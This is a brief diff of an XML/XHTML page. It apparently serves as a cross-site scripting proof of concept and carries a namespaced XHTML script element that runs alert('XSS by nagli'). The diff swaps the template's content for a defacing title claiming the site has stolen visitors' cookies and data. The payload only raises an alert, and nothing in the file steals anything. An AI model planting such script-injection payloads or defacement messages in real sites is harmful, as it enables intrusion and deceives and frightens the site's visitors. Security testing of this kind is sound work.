@@ -5,21 +5,8 @@
                 <a:script xmlns:a="http://www.w3.org/1999/xhtml">alert("XSS by nagli")</a:script>
                 <info>
                   <name>
-                    <title>Your HTML title</title>
-    <htmlData><![CDATA[<html>
-        <head>
-            <script/>
-        </head>
-        <body>
-        Your HTML's body
-        </body>
-        </html>
-     ]]>
-    </htmlData>
+                    <title>I have stole your cookies and data, this site maybe seem legitimate but it isn't</title>
                   </name>
-                    <description>
-                      <value>Hello</value>
-                    </description>
                 </info>
         </body>
 </html>
